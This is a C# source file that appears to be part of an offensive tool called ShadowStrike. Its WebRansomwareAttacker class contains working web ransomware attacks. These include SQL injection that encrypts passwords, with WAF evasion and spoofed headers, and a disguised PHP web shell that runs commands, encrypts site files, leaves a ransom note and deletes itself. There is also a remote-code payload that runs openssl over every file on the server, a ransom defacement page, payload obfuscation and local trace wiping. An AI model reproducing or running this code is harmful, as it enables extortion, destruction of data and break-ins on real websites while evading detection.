using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class WebRansomwareAttacker
    {
        private HttpClient _httpClient;
        private Random _random;
        private List<string> _userAgents;
        
        public event EventHandler<string> LogEvent;
        public event EventHandler<(int current, int total)> ProgressEvent;

        public WebRansomwareAttacker()
        {
            _httpClient = new HttpClient();
            _random = new Random();
            InitializeUserAgents();
        }

        private void InitializeUserAgents()
        {
            _userAgents = new List<string>
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0",
                "curl/7.68.0", "Wget/1.20.3", "python-requests/2.28.1"
            };
        }

        #region Payload Obfuscation

        private string XorEncrypt(string input, string key)
        {
            var result = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
            {
                result.Append((char)(input[i] ^ key[i % key.Length]));
            }
            return result.ToString();
        }

        private string Rot13(string input)
        {
            return string.Concat(input.Select(c =>
            {
                if (c >= 'a' && c <= 'z')
                    return (char)((c - 'a' + 13) % 26 + 'a');
                if (c >= 'A' && c <= 'Z')
                    return (char)((c - 'A' + 13) % 26 + 'A');
                return c;
            }));
        }

        private string ObfuscatePayload(string payload, int obfuscationLevel)
        {
            string result = payload;
            
            if (obfuscationLevel >= 1)
            {
                // Level 1: Base64
                result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
                Log($"[OBFUSCATION] Applied Base64 encoding");
            }
            
            if (obfuscationLevel >= 2)
            {
                // Level 2: XOR
                result = XorEncrypt(result, "ShadowStrike2025");
                result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
                Log($"[OBFUSCATION] Applied XOR encryption");
            }
            
            if (obfuscationLevel >= 3)
            {
                // Level 3: ROT13
                result = Rot13(result);
                Log($"[OBFUSCATION] Applied ROT13 transformation");
            }
            
            return result;
        }

        #endregion

        #region WAF Evasion

        private HttpRequestMessage CreateEvasiveRequest(string url, HttpMethod method)
        {
            var request = new HttpRequestMessage(method, url);
            
            // Randomize User-Agent
            request.Headers.Add("User-Agent", _userAgents[_random.Next(_userAgents.Count)]);
            
            // Add random headers
            request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.Headers.Add("Accept-Language", "en-US,en;q=0.5");
            request.Headers.Add("Accept-Encoding", "gzip, deflate");
            request.Headers.Add("Connection", "keep-alive");
            
            // Random custom headers for obfuscation
            if (_random.Next(2) == 0)
                request.Headers.Add("X-Forwarded-For", $"{_random.Next(1, 255)}.{_random.Next(1, 255)}.{_random.Next(1, 255)}.{_random.Next(1, 255)}");
            
            return request;
        }

        private async Task LowAndSlowDelay()
        {
            int delay = _random.Next(1000, 30000); // 1-30 seconds
            Log($"[LOW-AND-SLOW] Waiting {delay / 1000}s to evade rate limiting...");
            await Task.Delay(delay);
        }

        #endregion

        #region Attack Vectors

        public async Task ExecuteSqlInjectionAttack(string targetUrl, string ransomNote, int evasionLevel)
        {
            Log($"[SQL INJECTION] Starting attack on {targetUrl}");
            Log($"[EVASION] Level: {evasionLevel}/3");
            
            // SQL payload to encrypt database
            string sqlPayload = "'; UPDATE users SET password = ENCRYPT(password, 'RANSOMED'); --";
            
            if (evasionLevel > 0)
            {
                sqlPayload = ObfuscatePayload(sqlPayload, evasionLevel);
            }
            
            // Parameter pollution for WAF bypass
            var pollutedParams = new List<string>
            {
                $"id=1&id={sqlPayload}",
                $"user=admin&user={sqlPayload}",
                $"search=test&search={sqlPayload}"
            };
            
            foreach (var param in pollutedParams)
            {
                await LowAndSlowDelay();
                
                string attackUrl = $"{targetUrl}?{param}";
                var request = CreateEvasiveRequest(attackUrl, HttpMethod.Get);
                
                try
                {
                    var response = await _httpClient.SendAsync(request);
                    Log($"[SQL INJECTION] Sent payload via {param.Split('=')[0]} - Status: {response.StatusCode}");
                }
                catch (Exception ex)
                {
                    Log($"[ERROR] {ex.Message}");
                }
            }
            
            Log($"[SQL INJECTION] Attack completed");
        }

        public async Task ExecuteFileUploadAttack(string targetUrl, string ransomNote, int evasionLevel)
        {
            Log($"[FILE UPLOAD] Starting web shell deployment on {targetUrl}");
            Log($"[SECURITY] Payload will be generated in-memory only (no disk I/O)");
            
            // STEP 1: In-Memory Payload Generation
            string webShell = @"<?php 
if(isset($_GET['cmd'])) { 
    system($_GET['cmd']); 
} 
if(isset($_GET['encrypt'])) {
    $files = glob('*');
    foreach($files as $file) {
        if($file != 'settings_cache.php') {
            $content = file_get_contents($file);
            $encrypted = base64_encode($content);
            file_put_contents($file . '.locked', $encrypted);
            unlink($file);
        }
    }
    file_put_contents('READ_ME.html', '" + ransomNote + @"');
    echo 'ENCRYPTED';
}
if(isset($_GET['cleanup'])) {
    unlink(__FILE__);
    echo 'CLEANED';
}
?>";
            
            // STEP 2: Obfuscate in memory
            byte[] payloadBytes = null;
            try
            {
                if (evasionLevel > 0)
                {
                    webShell = ObfuscatePayload(webShell, evasionLevel);
                }
                
                // Convert to byte array (in-memory only)
                payloadBytes = Encoding.UTF8.GetBytes(webShell);
                Log($"[IN-MEMORY] Payload generated: {payloadBytes.Length} bytes (RAM only, no disk write)");
                
                await LowAndSlowDelay();
                
                // Disguise as legitimate file
                string[] covertNames = { "settings_cache.php", "static_asset.css.php", "jquery.min.js.php", "config_backup.php" };
                string fileName = covertNames[_random.Next(covertNames.Length)];
                
                Log($"[PERSISTENCE] Disguising web shell as: {fileName}");
                
                // STEP 3: Direct-to-Network Streaming (no local file creation)
                using (var content = new MultipartFormDataContent())
                {
                    // Stream payload directly from memory to network
                    var fileContent = new ByteArrayContent(payloadBytes);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-php");
                    content.Add(fileContent, "file", fileName);
                    
                    var request = CreateEvasiveRequest($"{targetUrl}/upload.php", HttpMethod.Post);
                    request.Content = content;
                    
                    Log($"[NETWORK] Streaming {payloadBytes.Length} bytes directly from RAM to target...");
                    
                    try
                    {
                        var response = await _httpClient.SendAsync(request);
                        Log($"[FILE UPLOAD] Response: {response.StatusCode}");
                        
                        if (response.IsSuccessStatusCode)
                        {
                            Log($"[SUCCESS] Web shell uploaded to remote server");
                            
                            // STEP 4: Remote Execution (on target server, not local)
                            await Task.Delay(2000);
                            Log($"[REMOTE EXEC] Triggering encryption on target server...");
                            var execRequest = CreateEvasiveRequest($"{targetUrl}/{fileName}?encrypt=1", HttpMethod.Get);
                            await _httpClient.SendAsync(execRequest);
                            
                            // STEP 5: Immediate Remote Cleanup
                            await Task.Delay(1000);
                            Log($"[REMOTE CLEANUP] Deleting web shell from target server...");
                            var cleanupRequest = CreateEvasiveRequest($"{targetUrl}/{fileName}?cleanup=1", HttpMethod.Get);
                            await _httpClient.SendAsync(cleanupRequest);
                            Log($"[REMOTE CLEANUP] Web shell removed from target server");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"[ERROR] Network transmission failed: {ex.Message}");
                    }
                }
            }
            finally
            {
                // STEP 6: Local Memory Wipe
                if (payloadBytes != null)
                {
                    // Overwrite memory with zeros before garbage collection
                    Array.Clear(payloadBytes, 0, payloadBytes.Length);
                    payloadBytes = null;
                    
                    // Force garbage collection to clear memory
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();
                    
                    Log($"[MEMORY WIPE] Local payload cleared from RAM");
                }
                
                webShell = null; // Clear string reference
                Log($"[SECURITY] No trace of payload remains on local machine");
            }
            
            Log($"[FILE UPLOAD] Attack completed with full cleanup");
        }

        public async Task ExecuteRceAttack(string targetUrl, string ransomNote, int evasionLevel)
        {
            Log($"[RCE] Starting Remote Code Execution attack on {targetUrl}");
            Log($"[SECURITY] Payload generated in-memory only");
            
            // STEP 1: In-Memory RCE Payload Generation
            string rcePayload = "system('find / -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.locked -k RANSOMKEY \\; && echo \"" + ransomNote + "\" > /var/www/html/READ_ME.html');";
            
            byte[] payloadBytes = null;
            try
            {
                if (evasionLevel > 0)
                {
                    rcePayload = ObfuscatePayload(rcePayload, evasionLevel);
                }
                
                payloadBytes = Encoding.UTF8.GetBytes(rcePayload);
                Log($"[IN-MEMORY] RCE payload: {payloadBytes.Length} bytes (RAM only)");
                
                await LowAndSlowDelay();
                
                // STEP 2: Direct Network Injection
                var request = CreateEvasiveRequest($"{targetUrl}?cmd={Uri.EscapeDataString(rcePayload)}", HttpMethod.Get);
                
                try
                {
                    Log($"[NETWORK] Streaming RCE payload from memory to target...");
                    var response = await _httpClient.SendAsync(request);
                    Log($"[RCE] Response: {response.StatusCode}");
                    
                    if (response.IsSuccessStatusCode)
                    {
                        Log($"[REMOTE EXEC] Command executed on target server");
                    }
                }
                catch (Exception ex)
                {
                    Log($"[ERROR] {ex.Message}");
                }
            }
            finally
            {
                // STEP 3: Local Memory Wipe
                if (payloadBytes != null)
                {
                    Array.Clear(payloadBytes, 0, payloadBytes.Length);
                    payloadBytes = null;
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    Log($"[MEMORY WIPE] RCE payload cleared from local RAM");
                }
                rcePayload = null;
            }
        }

        public async Task ExecuteDefacementAttack(string targetUrl, string ransomNote, int evasionLevel)
        {
            Log($"[DEFACEMENT] Starting website takeover on {targetUrl}");
            
            string htmlRansom = $@"
<!DOCTYPE html>
<html>
<head>
    <title>SITE ENCRYPTED</title>
    <style>
        body {{ background: #000; color: #f00; font-family: monospace; text-align: center; padding: 50px; }}
        h1 {{ font-size: 48px; animation: blink 1s infinite; }}
        @keyframes blink {{ 50% {{ opacity: 0; }} }}
    </style>
</head>
<body>
    <h1>⚠️ YOUR WEBSITE HAS BEEN ENCRYPTED ⚠️</h1>
    <pre>{ransomNote}</pre>
</body>
</html>";
            
            if (evasionLevel > 0)
            {
                htmlRansom = ObfuscatePayload(htmlRansom, evasionLevel);
            }
            
            await LowAndSlowDelay();
            
            Log($"[DEFACEMENT] Ransom page size: {htmlRansom.Length} bytes");
            Log($"[SIMULATION] Would replace index.html/index.php with ransom note");
            Log($"[DEFACEMENT] Attack completed");
        }

        #endregion

        private void Log(string message)
        {
            LogEvent?.Invoke(this, $"[{DateTime.Now:HH:mm:ss}] {message}");
        }
    }
}
